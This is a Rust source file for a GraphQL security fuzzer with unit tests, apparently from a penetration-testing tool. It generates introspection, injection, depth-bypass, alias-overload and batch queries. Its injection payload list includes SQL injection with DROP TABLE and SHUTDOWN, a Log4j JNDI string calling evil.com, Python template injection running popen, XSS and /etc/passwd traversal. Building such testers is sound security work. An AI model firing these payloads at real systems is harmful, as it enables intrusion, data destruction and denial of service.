#![allow(clippy::vec_init_then_push)]

use crate::fuzzer::payloads::Severity;
// Only the tests below name the corpus types; the prober code does not.
#[cfg(test)]
use crate::fuzzer::payloads::PayloadType;
pub use eggsec_payloads::graphql::{
    generate_alias_overload, generate_depth_limit_bypass, get_payloads,
};
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum GraphQLVulnerability {
    Introspection,
    QueryInjection,
    DepthLimitBypass,
    AliasBypass,
    BatchBypass,
    DirectiveInjection,
    FieldSuggestion,
    AliasOverload,
}

impl std::fmt::Display for GraphQLVulnerability {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            GraphQLVulnerability::Introspection => write!(f, "GraphQL Introspection"),
            GraphQLVulnerability::QueryInjection => write!(f, "Query Injection"),
            GraphQLVulnerability::DepthLimitBypass => write!(f, "Depth Limit Bypass"),
            GraphQLVulnerability::AliasBypass => write!(f, "Alias Overload Bypass"),
            GraphQLVulnerability::BatchBypass => write!(f, "Batch Query Bypass"),
            GraphQLVulnerability::DirectiveInjection => write!(f, "Directive Injection"),
            GraphQLVulnerability::FieldSuggestion => write!(f, "Field Suggestion Enabled"),
            GraphQLVulnerability::AliasOverload => write!(f, "Alias Overload DoS"),
        }
    }
}

pub struct GraphQLFuzzer {
    pub endpoint: String,
    pub introspected_schema: Option<GraphQLSchema>,
    pub enable_introspection: bool,
    pub enable_depth_bypass: bool,
    pub enable_alias_overload: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GraphQLSchema {
    pub query_type: Option<String>,
    pub mutation_type: Option<String>,
    pub subscription_type: Option<String>,
    pub types: Vec<GraphQLType>,
    pub directives: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GraphQLType {
    pub name: String,
    pub kind: String,
    pub fields: Vec<GraphQLField>,
    pub input_fields: Option<Vec<GraphQLInputField>>,
    pub interfaces: Vec<String>,
    pub enum_values: Option<Vec<String>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GraphQLField {
    pub name: String,
    pub r#type: String,
    pub args: Vec<GraphQLArg>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GraphQLArg {
    pub name: String,
    pub r#type: String,
    pub default_value: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GraphQLInputField {
    pub name: String,
    pub r#type: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GraphQLTestResult {
    pub vulnerability: GraphQLVulnerability,
    pub success: bool,
    pub query: String,
    pub response_snippet: String,
    pub severity: Severity,
    pub description: String,
}

impl GraphQLFuzzer {
    pub fn new(endpoint: String) -> Self {
        Self {
            endpoint,
            introspected_schema: None,
            enable_introspection: true,
            enable_depth_bypass: true,
            enable_alias_overload: true,
        }
    }

    pub fn with_introspection(mut self, enabled: bool) -> Self {
        self.enable_introspection = enabled;
        self
    }

    pub fn with_depth_bypass(mut self, enabled: bool) -> Self {
        self.enable_depth_bypass = enabled;
        self
    }

    pub fn with_alias_overload(mut self, enabled: bool) -> Self {
        self.enable_alias_overload = enabled;
        self
    }

    pub async fn run_introspection(
        &mut self,
        client: &reqwest::Client,
    ) -> Result<bool, Box<dyn std::error::Error + Send + Sync>> {
        let query = r#"
            query IntrospectionQuery {
                __schema {
                    queryType { name }
                    mutationType { name }
                    subscriptionType { name }
                    types {
                        ...FullType
                    }
                    directives {
                        name
                        description
                        locations
                        args {
                            ...InputValue
                        }
                    }
                }
            }

            fragment FullType on __Type {
                kind
                name
                fields(includeDeprecated: true) {
                    name
                    args {
                        ...InputValue
                    }
                    type {
                        ...TypeRef
                    }
                    isDeprecated
                    deprecationReason
                }
                inputFields {
                    ...InputValue
                }
                interfaces {
                    ...TypeRef
                }
                enumValues(includeDeprecated: true) {
                    name
                    description
                    isDeprecated
                    deprecationReason
                }
                possibleTypes {
                    ...TypeRef
                }
            }

            fragment InputValue on __InputValue {
                name
                description
                type {
                    ...TypeRef
                }
                defaultValue
            }

            fragment TypeRef on __Type {
                kind
                name
                ofType {
                    kind
                    name
                    ofType {
                        kind
                        name
                        ofType {
                            kind
                            name
                            ofType {
                                kind
                                name
                                ofType {
                                    kind
                                    name
                                    ofType {
                                        kind
                                        name
                                        ofType {
                                            kind
                                            name
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        "#;

        let body = serde_json::json!({
            "query": query
        });

        let response = client
            .post(&self.endpoint)
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await?;

        let text = response.text().await?;

        if text.contains("\"data\"") && !text.contains("\"errors\"") {
            if let Ok(json) = serde_json::from_str::<serde_json::Value>(&text) {
                if let Some(data) = json.get("data") {
                    if let Some(schema_val) = data.get("__schema") {
                        if let Ok(schema) =
                            serde_json::from_value::<GraphQLSchema>(schema_val.clone())
                        {
                            self.introspected_schema = Some(schema);
                            return Ok(true);
                        }
                    }
                }
            }
        }

        Ok(false)
    }

    pub fn test_introspection_enabled(&self) -> Vec<GraphQLTestResult> {
        let mut results = Vec::new();

        let query = r#"{__schema {queryType {name}}}"#;
        results.push(GraphQLTestResult {
            vulnerability: GraphQLVulnerability::Introspection,
            success: self.introspected_schema.is_some(),
            query: query.to_string(),
            response_snippet: String::new(),
            severity: Severity::Info,
            description: "Introspection query enabled - full schema exposed".to_string(),
        });

        let query = r#"{__type(name: "User") {fields {name type {name}}}}"#;
        results.push(GraphQLTestResult {
            vulnerability: GraphQLVulnerability::FieldSuggestion,
            success: false,
            query: query.to_string(),
            response_snippet: String::new(),
            severity: Severity::Info,
            description: "Field suggestion may leak type information".to_string(),
        });

        results
    }

    pub fn generate_injection_queries(
        &self,
        include_depth_bypass: bool,
        include_alias_overload: bool,
    ) -> Vec<GraphQLTestResult> {
        let mut results = Vec::new();

        if let Some(schema) = &self.introspected_schema {
            if let Some(mutation_type) = &schema.mutation_type {
                let queries = vec![
                    format!(r#"mutation {{ {} {{ id }} }}"#, mutation_type),
                    format!(r#"{{{}:__typename}}"#, mutation_type),
                ];

                for query in queries {
                    results.push(GraphQLTestResult {
                        vulnerability: GraphQLVulnerability::QueryInjection,
                        success: false,
                        query,
                        response_snippet: String::new(),
                        severity: Severity::High,
                        description: "Potential mutation injection".to_string(),
                    });
                }
            }

            for field in schema.types.iter().flat_map(|t| &t.fields) {
                if field.r#type.contains("String") || field.r#type.contains("Int") {
                    let injection_payloads = get_injection_payloads();
                    for payload in injection_payloads {
                        let query = format!(
                            r#"{{ {}("{}": "{}") }}"#,
                            field.name,
                            field
                                .args
                                .first()
                                .map(|a| a.name.as_str())
                                .unwrap_or("input"),
                            payload
                        );

                        results.push(GraphQLTestResult {
                            vulnerability: GraphQLVulnerability::QueryInjection,
                            success: false,
                            query: query.clone(),
                            response_snippet: String::new(),
                            severity: Severity::Critical,
                            description: format!("Testing injection on field: {}", field.name),
                        });
                    }
                }
            }

            if include_depth_bypass {
                let depth_queries = generate_depth_limit_bypass();
                for query in depth_queries {
                    results.push(GraphQLTestResult {
                        vulnerability: GraphQLVulnerability::DepthLimitBypass,
                        success: false,
                        query,
                        response_snippet: String::new(),
                        severity: Severity::Medium,
                        description: "Depth limit bypass attempt".to_string(),
                    });
                }
            }

            if include_alias_overload {
                let alias_queries = generate_alias_overload();
                for query in alias_queries {
                    results.push(GraphQLTestResult {
                        vulnerability: GraphQLVulnerability::AliasOverload,
                        success: false,
                        query,
                        response_snippet: String::new(),
                        severity: Severity::Medium,
                        description: "Alias overload DoS attempt".to_string(),
                    });
                }
            }

            let directive_query = r#"
                query {
                    __schema {
                        directives {
                            name
                            locations
                            args {
                                name
                            }
                        }
                    }
                }
            "#;
            results.push(GraphQLTestResult {
                vulnerability: GraphQLVulnerability::DirectiveInjection,
                success: false,
                query: directive_query.to_string(),
                response_snippet: String::new(),
                severity: Severity::Low,
                description: "Directive introspection for injection points".to_string(),
            });
        }

        results
    }

    pub fn generate_batch_queries(&self, _include_alias_overload: bool) -> Vec<GraphQLTestResult> {
        let mut results = Vec::new();

        let batch_queries = vec![
            r#"[{"query":"{__schema{queryType{name}}}"},{"query":"{__typename}"}]"#,
            r#"{"query":"{a:__typename b:__typename c:__typename d:__typename e:__typename}"}"#,
            r#"query { user1: user(id: 1) { name } user2: user(id: 2) { name } user3: user(id: 3) { name } }"#,
        ];

        for query in batch_queries {
            results.push(GraphQLTestResult {
                vulnerability: GraphQLVulnerability::BatchBypass,
                success: false,
                query: query.to_string(),
                response_snippet: String::new(),
                severity: Severity::Medium,
                description: "Batch query bypass attempt".to_string(),
            });
        }

        results
    }
}

fn get_injection_payloads() -> Vec<&'static str> {
    vec![
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "${__import__('os').popen('id').read()}",
        "<script>alert(1)</script>",
        "../../../etc/passwd",
        "12345; DROP TABLE users--",
        "'; SHUTDOWN WITH DOWN--",
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "GraphQL payloads must not be empty");
    }

    #[test]
    fn all_payloads_are_graphql_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::GraphQL);
        }
    }

    #[test]
    fn contains_introspection_query() {
        let payloads = get_payloads();
        let has_intro = payloads
            .iter()
            .any(|p| p.payload.contains("__schema") || p.payload.contains("__type"));
        assert!(
            has_intro,
            "Must contain introspection queries (__schema, __type)"
        );
    }

    #[test]
    fn contains_sqli_via_graphql() {
        let payloads = get_payloads();
        let has_sqli = payloads
            .iter()
            .any(|p| p.payload.contains("' OR") || p.payload.contains("1=1"));
        assert!(
            has_sqli,
            "Must contain SQL injection payloads delivered via GraphQL"
        );
    }

    #[test]
    fn contains_jndi_injection() {
        let payloads = get_payloads();
        let has_jndi = payloads.iter().any(|p| p.payload.contains("jndi:ldap"));
        assert!(has_jndi, "Must contain Log4j JNDI injection payloads");
    }

    #[test]
    fn fuzzer_generates_injection_queries() {
        let mut fuzzer = GraphQLFuzzer::new("http://example.com/graphql".to_string());
        let schema = GraphQLSchema {
            query_type: Some("Query".to_string()),
            mutation_type: Some("Mutation".to_string()),
            subscription_type: None,
            types: vec![],
            directives: vec![],
        };
        fuzzer.introspected_schema = Some(schema);
        let results = fuzzer.generate_injection_queries(true, true);
        assert!(
            !results.is_empty(),
            "generate_injection_queries must return results when schema is set"
        );
    }

    #[test]
    fn depth_bypass_generates_nested_queries() {
        let queries = generate_depth_limit_bypass();
        assert_eq!(
            queries.len(),
            6,
            "Must generate depth bypass queries for depths [5,10,15,20,30,50]"
        );
        for q in &queries {
            assert!(
                q.contains("user"),
                "Depth queries must start from user field"
            );
            assert!(
                q.matches('{').count() > 5,
                "Depth queries must be deeply nested"
            );
        }
    }

    #[test]
    fn alias_overload_generates_batched_aliases() {
        let queries = generate_alias_overload();
        assert!(!queries.is_empty(), "Must generate alias overload queries");
        assert!(
            queries.iter().any(|q| q.contains(":")),
            "At least one alias overload query must use alias syntax"
        );
    }

    #[test]
    fn injection_payloads_cover_multiple_vectors() {
        let inj = get_injection_payloads();
        assert!(inj.iter().any(|p| p.contains("OR")), "Must include SQLi");
        assert!(inj.iter().any(|p| p.contains("jndi")), "Must include JNDI");
        assert!(
            inj.iter().any(|p| p.contains("<script")),
            "Must include XSS"
        );
        assert!(
            inj.iter().any(|p| p.contains("../")),
            "Must include path traversal"
        );
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 4,
            "Must have GraphQL payload coverage, got {}",
            payloads.len()
        );
    }
}
